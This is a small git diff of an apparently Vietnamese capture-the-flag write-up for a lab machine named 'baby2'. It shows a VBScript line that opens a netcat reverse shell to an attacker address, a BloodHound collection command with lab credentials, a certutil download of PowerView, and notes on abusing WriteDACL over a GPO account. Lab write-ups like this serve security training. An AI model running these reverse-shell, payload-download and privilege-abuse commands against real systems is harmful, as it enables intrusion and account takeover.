@@ -104,19 +104,23 @@ oShell.run "cmd.exe /c C:\Temp\nc.exe 10.8.3.170 443 -e cmd.exe"
 vay la t co the control duoc user ```baby2\amelia.griffiths```
 
 den gio thi khong co huong phat trien tiep vi vay ta se phat trien tiep su dung bloodhound
+
 ```
 bloodhound-python -d 'baby2.vl' -u 'Carl.Moore' -p 'Carl.Moore' -c all -ns 10.10.93.93 --zip
 ```
+
 ![alt text](/assets/img/baby2/image-12.png)
 
 ![alt text](/assets/img/baby2/image-14.png)
 
 ta thay la user cua ta co the ```WRITEDACL``` toi ```GPOadm```
 ta import powerview de co the chay nhie command hon
+
 ```
 certutil -urlcache -f http://10.8.3.170:8888/powerview.ps1 powerview.ps1
 import-module ./powerview.ps1
 ```
+
 ![alt text](/assets/img/baby2/image-13.png)
 
 vi ta co quyen WriteDACL len GPO vi vay ta co the doi mat khau cua ```gpoadm```
